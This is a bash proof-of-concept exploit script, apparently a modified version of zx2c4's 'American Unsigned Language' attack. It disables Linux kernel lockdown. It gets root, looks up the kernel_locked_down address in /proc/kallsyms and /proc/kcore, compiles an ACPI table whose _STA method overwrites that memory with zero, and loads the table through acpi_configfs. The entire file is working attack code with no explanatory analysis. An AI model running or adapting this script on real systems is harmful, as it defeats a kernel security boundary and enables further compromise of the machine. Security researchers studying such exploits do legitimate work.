#!/bin/bash

# American Unsigned Language 3
# ============================
# by zx2c4 (Modified for your system)
#
# This PoC injects an ACPI table via configfs and overrides `_STA` to disable lockdown.

set -e

SELF="$(readlink -f "${BASH_SOURCE[0]}")"
[[ $UID == 0 ]] || exec sudo -- "$BASH" -- "$SELF" "$@"

echo "===================================="
echo "=   American Unsigned Language 3   ="
echo "=       Modified for Your ACPI      ="
echo "===================================="

# Function to check lockdown status
lockdown_status() {
    echo "[+] Checking lockdown status"
    [[ $(< /sys/kernel/security/lockdown) =~ \[([a-z]+)\] ]]
    echo " *  lockdown = ${BASH_REMATCH[1]}"
    if [[ ${BASH_REMATCH[1]} == none ]]; then
        echo "[+] Success"
        exit 0
    fi
}

lockdown_status

# Install dependencies if needed
if ! command -v iasl >/dev/null 2>&1; then
    echo "[+] Installing dependencies"
    apt-get install -y acpica-tools
fi

echo "[+] Resolving kernel symbols"
read -r addr type symbol < <(grep -F kernel_locked_down /proc/kallsyms)
[[ $symbol == kernel_locked_down ]]
addr=$(( 0x$addr ))
printf ' *  kernel_locked_down = 0x%x\n' "$addr"

echo "[+] Mapping virtual address to physical address"
IFS== read -r _ phys_base < <(grep -aFm 1 phys_base /proc/kcore)
printf ' *  phys_base = 0x%x\n' "$phys_base"
addr=$(( $addr - 0xffffffff80000000 + $phys_base ))
printf ' *  kernel_locked_down = 0x%x\n' "$addr"

echo "[+] Constructing ASL"
trap 'rm -f /root/trigger.aml' EXIT
iasl -p "/root/trigger" /dev/stdin > /dev/null <<-_EOF
    DefinitionBlock ("trigger.aml", "SSDT", 2, "", "", 0x00001001) {
      External (\_SB._STA, MethodObj) // Override an existing _STA method
      OperationRegion (KMEM, SystemMemory, $(printf '0x%x' "$addr"), 4)
      Field (KMEM, DWordAcc, NoLock, WriteAsZeros) {
        LKDN, 32
      }
      Method (\_SB._STA) {
        LKDN = Zero
        Return (Zero)
      }
    }
_EOF

echo "[+] Installing ASL"
modprobe acpi_configfs
echo "probing done"
[[ -d /sys/kernel/config/acpi/table/aml ]] && rmdir /sys/kernel/config/acpi/table/aml
mkdir -p /sys/kernel/config/acpi/table/aml
cat /root/trigger.aml > /sys/kernel/config/acpi/table/aml/aml
echo "write to aml done!"
sleep 0.5

lockdown_status
echo "[-] Failure"
